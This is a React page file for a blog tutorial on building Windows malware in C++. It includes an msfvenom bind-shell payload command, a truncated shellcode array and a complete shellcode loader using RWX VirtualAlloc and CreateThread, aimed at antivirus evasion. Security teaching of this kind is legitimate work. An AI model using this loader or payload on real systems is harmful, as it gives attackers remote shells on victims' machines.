"use client";

import PageLayout from "@/components/PageLayout";
import { motion } from "framer-motion";
import { ArrowLeft, Code, Shield, Cpu, FileCode, Bug, Terminal, AlertTriangle, MemoryStick, Cog, Binary } from "lucide-react";

import Link from "next/link";
import Image from "next/image";
import { isPostComingSoon } from "@/lib/blogUtils";
import { useEffect } from "react";
import { useRouter } from "next/navigation";

// Optional: Table of Contents component (remove if not needed)
const TableOfContents = () => (
  <div className="hidden lg:block p-4 lg:p-6 bg-background/50 border border-border rounded-lg sticky top-24">
    <h2 className="text-base lg:text-lg font-light mb-4 text-foreground">Table of Contents</h2>
    <ul className="space-y-2 text-foreground/70 font-light text-xs lg:text-sm">
      <li><a href="#why-cpp" className="hover:text-foreground transition-colors">1. Why C++?</a></li>
      <li><a href="#av-detection" className="hover:text-foreground transition-colors">2. How Antivirus Detection Works</a></li>
      <li><a href="#setup" className="hover:text-foreground transition-colors">3. Setting Up the Project</a></li>
      <li><a href="#shellcode" className="hover:text-foreground transition-colors">4. Generating Shellcode</a></li>
      <li><a href="#malware-code" className="hover:text-foreground transition-colors">5. Writing the Malware in C++</a></li>
      <li><a href="#code-explained" className="hover:text-foreground transition-colors">6. Code Explained in Detail</a></li>
      <li><a href="#testing" className="hover:text-foreground transition-colors">7. Testing the Output</a></li>
      <li><a href="#wrap-up" className="hover:text-foreground transition-colors">8. Wrap-Up</a></li>
    </ul>
  </div>
);

// Section component for consistent styling
const Section = ({ id, title, children, icon: Icon }: { id: string, title: string, children: React.ReactNode, icon: React.ElementType }) => (
  <motion.section 
    id={id} 
    initial={{ opacity: 0, y: 20 }}
    whileInView={{ opacity: 1, y: 0 }}
    transition={{ duration: 0.5 }}
    viewport={{ once: true }}
    className="mb-12"
  >
    <div className="flex items-center mb-4">
      <Icon className="h-5 w-5 mr-3 text-foreground/60" />
      <h2 className="text-2xl md:text-3xl font-light tracking-tight text-foreground">{title}</h2>
    </div>
    <div className="text-foreground/80 font-light leading-relaxed break-words overflow-x-hidden max-w-full">
      {children}
    </div>
  </motion.section>
);

// CodeBlock component for code snippets
const CodeBlock = ({ code, language }: { code: string, language: string }) => (
  <div className="bg-black/80 border border-border rounded-lg p-3 sm:p-4 my-6 overflow-x-auto max-w-full">
    <div className="flex justify-between items-center mb-2">
      <span className="text-foreground/60 text-xs sm:text-sm font-mono">{language}</span>
    </div>
    <pre className="text-foreground/90 font-mono text-xs sm:text-sm leading-relaxed whitespace-pre-wrap break-words overflow-wrap-anywhere word-break-break-all max-w-full">
      <code className="break-words break-all">{code}</code>
    </pre>
  </div>
);

export default function BlogPost() {
  const router = useRouter();
  
  useEffect(() => {
    // Check if this post is marked as coming soon
    if (isPostComingSoon("/blog/malware-cpp-basics")) {
      router.push("/blog");
    }
  }, [router]);

  // If coming soon, don't render content (will redirect)
  if (isPostComingSoon("/blog/malware-cpp-basics")) {
    return null;
  }

  return (
    <PageLayout>
      <div className="container mx-auto px-4 sm:px-6 lg:px-8 py-12 overflow-x-hidden w-full">
        <div className="max-w-5xl mx-auto w-full">
          {/* Back button */}
          <Link 
            href="/blog" 
            className="inline-flex items-center text-foreground/70 hover:text-foreground transition-colors font-light text-sm mb-8"
          >
            <ArrowLeft className="mr-2 h-4 w-4" /> Back to yaps
          </Link>

          {/* Header */}
          <header className="text-center mb-12">
            <motion.h1
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5 }}
              className="text-3xl sm:text-4xl md:text-5xl font-extralight tracking-tight mb-6 text-foreground break-words"
            >
              0x01 — Building Malware in C++: Memory Execution, Shellcode, and AV Evasion Basics
            </motion.h1>
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5, delay: 0.1 }}
              className="text-sm text-foreground/60 font-light"
            >
              <span>May 18, 2025</span>
              <span className="mx-2">•</span>
              <span>4 min read</span>
            </motion.div>
          </header>


          {/* Optional: Featured Image */}
          <div className="relative w-full max-w-full aspect-[16/8] rounded-lg overflow-hidden my-12 border border-border">
            <Image
              src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&q=80&w=1470"
              alt="C++ Malware Development - Memory Execution and Shellcode"
              fill
              className="object-cover"
              sizes="100vw"
            />
          </div>

          {/* Content Grid */}
          <div className="grid lg:grid-cols-4 gap-6 lg:gap-12 w-full max-w-full">
            <div className="lg:col-span-3 w-full max-w-full overflow-x-hidden">
              
              {/* Introduction */}
              <div className="mb-8">
                <p className="text-foreground/80 font-light leading-relaxed break-words mb-4">
                  This is the first entry in my malware development series, where I'll walk through building actual malware from scratch using C++. I'm starting with the fundamentals: executing shellcode directly in memory using Windows API calls. The focus is on practical implementation — but this series will also explore the concepts that make these techniques work.
                </p>
              </div>

              {/* Why C++ */}
              <Section id="why-cpp" title="Why C++?" icon={Binary}>
                <p className="mb-4 break-words">
                  I'm using C++ for a few reasons:
                </p>
                <ul className="list-disc list-inside mb-4 space-y-2 text-foreground/80 font-light">
                  <li><span className="font-medium text-foreground">Low-level access:</span> It gives direct access to Windows APIs and memory functions, unlike managed languages like C# or scripting languages like PowerShell.</li>
                  <li><span className="font-medium text-foreground">No runtime overhead:</span> C++ binaries are native executables. There's no .NET or scripting engine to trace, which makes them stealthier.</li>
                  <li><span className="font-medium text-foreground">Better evasion:</span> Since C++ compiles to raw machine code, reversing and analyzing the behavior becomes more complex for defenders.</li>
                </ul>
                <p className="font-medium text-foreground break-words">
                  C++ is also widely used in real-world malware for the same reasons — it provides full control without needing interpreters or virtual machines.
                </p>
              </Section>

              {/* AV Detection */}
              <Section id="av-detection" title="How Antivirus Detection Works" icon={Shield}>
                <p className="mb-4 break-words">
                  Before writing any code, it's essential to understand how malware is detected by AV engines. This shapes how malware needs to be written and how it attempts to evade analysis.
                </p>

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">1. Signature-Based Detection</h3>
                <p className="mb-4 break-words">
                  This is the oldest and most basic method. AVs look for known byte sequences or hashes (e.g., MD5, SHA-1) of previously identified malware. If the shellcode or even certain API call patterns match a known signature, the file is flagged immediately.
                </p>

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">2. Heuristic Analysis</h3>
                <p className="mb-4 break-words">
                  This focuses on behavior. Even if a file doesn't match any known signature, suspicious API usage like:
                </p>
                <ul className="list-disc list-inside mb-4 space-y-2 text-foreground/80 font-light">
                  <li>VirtualAlloc (memory allocation with execute permission)</li>
                  <li>CreateRemoteThread</li>
                  <li>LoadLibrary and GetProcAddress (dynamic API resolution)</li>
                </ul>
                <p className="mb-4 break-words">
                  can trigger a detection.
                </p>

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">3. Sandboxing</h3>
                <p className="mb-4 break-words">
                  Modern AV tools run binaries in isolated environments to observe behavior. If a file creates a network connection, opens a reverse shell, modifies the registry, or drops a payload, it gets flagged.
                </p>
              </Section>

              {/* Setup */}
              <Section id="setup" title="Setting Up the Project" icon={Cog}>
                <p className="mb-4 break-words">
                  <span className="font-medium text-foreground">Environment:</span>
                </p>
                <ul className="list-disc list-inside mb-4 space-y-2 text-foreground/80 font-light">
                  <li>Windows 10/11</li>
                  <li>Visual Studio 2022</li>
                  <li>Target architecture: x64</li>
                </ul>

                <p className="mb-4 break-words">
                  <span className="font-medium text-foreground">Steps:</span>
                </p>
                <ol className="list-decimal list-inside mb-4 space-y-2 text-foreground/80 font-light">
                  <li>Create a new Windows Console Application (C++) in Visual Studio.</li>
                  <li>Set the configuration to Release (to strip debug symbols).</li>
                  <li>Change platform to x86 for maximum compatibility with payloads.</li>
                  <li>Turn off /GS (buffer security checks) and enable /NODEFAULTLIB if needed later for anti-analysis.</li>
                </ol>
              </Section>

              {/* Shellcode */}
              <Section id="shellcode" title="Generating Shellcode" icon={Code}>
                <p className="mb-4 break-words">
                  To generate raw shellcode, I used Metasploit's msfvenom:
                </p>

                <CodeBlock 
                  code={`msfvenom -p windows/shell_bind_tcp LPORT=4444 -f c`}
                  language="bash"
                />

                <p className="mb-4 break-words">
                  <span className="font-medium text-foreground">Breakdown:</span>
                </p>
                <ul className="list-disc list-inside mb-4 space-y-2 text-foreground/80 font-light">
                  <li><span className="font-medium">-p windows/shell_bind_tcp:</span> This payload listens on port 4444 and provides a shell once connected.</li>
                  <li><span className="font-medium">LPORT=4444:</span> Port to listen on.</li>
                  <li><span className="font-medium">-f c:</span> Output format for C-style byte array.</li>
                </ul>

                <p className="mb-4 break-words">
                  The result is a block of machine code like this:
                </p>

                <CodeBlock 
                  code={`unsigned char buf[] = 
"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0..."`}
                  language="c"
                />

                <p className="mb-4 break-words">
                  This array contains all the instructions to run the bind shell. Once loaded and executed, it will open a listener on the system waiting for a connection on port 4444.
                </p>
              </Section>

              {/* Malware Code */}
              <Section id="malware-code" title="Writing the Malware in C++" icon={FileCode}>
                <p className="mb-4 break-words">
                  Here's the full source code that executes shellcode in memory using the Windows API:
                </p>

                <CodeBlock 
                  code={`#include <Windows.h>

int main() {
    unsigned char buf[] = {
        // insert shellcode here
    };

    // Allocate memory with execution permissions
    PVOID exec_mem = VirtualAlloc(
        0,
        sizeof(buf),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (exec_mem == NULL) return 1;

    // Copy the shellcode into the allocated memory
    RtlCopyMemory(exec_mem, buf, sizeof(buf));

    // Create a new thread to run the shellcode
    DWORD threadID;
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)exec_mem,
        NULL,
        0,
        &threadID
    );

    if (hThread == NULL) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }

    // Wait for the thread to finish executing
    WaitForSingleObject(hThread, INFINITE);
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}`}
                  language="c"
                />
              </Section>

              {/* Code Explained */}
              <Section id="code-explained" title="Code Explained in Detail" icon={Terminal}>
                
                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">VirtualAlloc</h3>
                <CodeBlock 
                  code={`PVOID exec_mem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);`}
                  language="c"
                />
                <ul className="list-disc list-inside mb-4 space-y-2 text-foreground/80 font-light">
                  <li>Allocates memory at runtime.</li>
                  <li><span className="font-medium">MEM_COMMIT | MEM_RESERVE:</span> Reserve and commit the memory in one call.</li>
                  <li><span className="font-medium">PAGE_EXECUTE_READWRITE:</span> Critical. This sets the memory region as readable, writable, and executable.</li>
                </ul>
                <p className="mb-4 break-words">
                  This is the most suspicious line in terms of heuristic detection. Allocating RWX memory is a strong signal of shellcode execution.
                </p>

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">RtlCopyMemory</h3>
                <CodeBlock 
                  code={`RtlCopyMemory(exec_mem, buf, sizeof(buf));`}
                  language="c"
                />
                <p className="mb-4 break-words">
                  Copies the shellcode (buf) into the memory block we just allocated. Functionally similar to memcpy, but this version is provided by Windows and works well with low-level operations.
                </p>

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">CreateThread</h3>
                <CodeBlock 
                  code={`HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, &threadID);`}
                  language="c"
                />
                <p className="mb-4 break-words">
                  This line tells Windows: "Start a new thread and begin executing instructions at the memory address where the shellcode was copied."
                </p>
                <ul className="list-disc list-inside mb-4 space-y-2 text-foreground/80 font-light">
                  <li>The exec_mem pointer is cast into a function pointer type to avoid compiler errors.</li>
                  <li>LPTHREAD_START_ROUTINE expects a function of the form: DWORD WINAPI FunctionName(LPVOID lpParam);</li>
                  <li>Shellcode doesn't follow that structure — but casting tricks the compiler into accepting it.</li>
                </ul>

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">WaitForSingleObject</h3>
                <CodeBlock 
                  code={`WaitForSingleObject(hThread, INFINITE);`}
                  language="c"
                />
                <p className="mb-4 break-words">
                  This waits indefinitely for the shellcode thread to complete before continuing. In this case, the main thread just stalls while the shellcode handles everything else.
                </p>

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">References</h3>
                <ul className="list-disc list-inside mb-4 space-y-2 text-foreground/80 font-light">
                  <li>VirtualAlloc — Memory Allocation (Win32 API)</li>
                  <li>RtlCopyMemory — Memory Copy Routine (Windows Driver API)</li>
                  <li>CreateThread — Thread Creation (Win32 API)</li>
                  <li>WaitForSingleObject — Synchronization (Win32 API)</li>
                </ul>
              </Section>

              {/* Testing */}
              <Section id="testing" title="Testing the Output" icon={Bug}>
                <p className="mb-4 break-words">
                  Once compiled (Release mode), the executable can be analyzed using:
                </p>
                <ul className="list-disc list-inside mb-4 space-y-2 text-foreground/80 font-light">
                  <li><span className="font-medium">Process Hacker:</span> Watch for thread creation and memory allocations.</li>
                  <li><span className="font-medium">Procmon:</span> Observe API calls and behavior.</li>
                  <li><span className="font-medium">VirusTotal:</span> Upload to scan against 70+ AV engines.</li>
                </ul>
                <p className="font-medium text-foreground break-words">
                  Note: Detection is almost guaranteed in this version due to use of known payloads and high-risk API calls. But this is just the base.
                </p>
              </Section>

              {/* Wrap Up */}
              <Section id="wrap-up" title="What's Next" icon={MemoryStick}>

                <p className="mb-4 break-words">
                  This malware is functional, but not stealthy.
                </p>
                <p className="mb-4 break-words">
                  In the next entry (0x02), I'll implement:
                </p>
                <ul className="list-disc list-inside mb-4 space-y-2 text-foreground/80 font-light">
                  <li>XOR-based encoding for obfuscating shellcode</li>
                  <li>Dynamic API resolution to evade static signature detection</li>
                  <li>Basic sandbox evasion techniques</li>
                </ul>
                <p className="mb-4 break-words">
                  This is where it starts to get more interesting — taking the same malware structure and making it harder to detect.
                </p>
                <p className="font-medium text-foreground break-words">
                  That's it for 0x01. Just some shellcode, a bit of memory magic, and a thread to tie it all together. Nothing fancy — just raw, hands-on malware work.
                </p>
                <p className="mb-4 break-words">
                  I'll keep digging deeper in the next entry. Until then, stay curious, keep reversing… and don't forget to clean your build folder.
                </p>
                <p className="font-mono text-foreground/70 break-words">
                  — printf("bye~\\n");
                </p>
              </Section>
            </div>
            
            {/* Optional: Sidebar with Table of Contents */}
            <aside className="lg:col-span-1 hidden lg:block">
              <TableOfContents />
            </aside>
          </div>

          {/* Footer */}
          <div className="mt-12 text-center">
            {/* Tags */}
            <div className="flex flex-wrap gap-2 justify-center mb-8">
              {['Malware Development', 'C++', 'Shellcode', 'Memory Execution', 'AV Evasion', 'Windows API', 'Red Team'].map(tag => (
                <span key={tag} className="px-3 py-1 bg-background/50 border border-border rounded-full text-xs font-light text-foreground/70">
                  {tag}
                </span>
              ))}
            </div>

            {/* Legal Disclaimer */}
            <div className="bg-background/50 border border-border p-4 sm:p-6 rounded-lg my-8 max-w-2xl mx-auto">
              <h3 className="text-lg sm:text-xl font-light mb-3 text-foreground break-words">Legal & Ethical Notice</h3>
              <p className="text-foreground/80 font-light leading-relaxed break-words">
                This educational content demonstrates security concepts for defensive purposes. All techniques shown are for academic understanding and authorized penetration testing only. Unauthorized access to computer systems is illegal.
              </p>
            </div>

            {/* Back to yaps link */}
            <Link 
              href="/blog" 
              className="inline-flex items-center text-foreground/70 hover:text-foreground transition-colors font-light text-sm border border-border px-4 py-2 rounded hover:border-foreground/30"
            >
              More Yaps
            </Link>
          </div>
        </div>
      </div>
    </PageLayout>
  );
}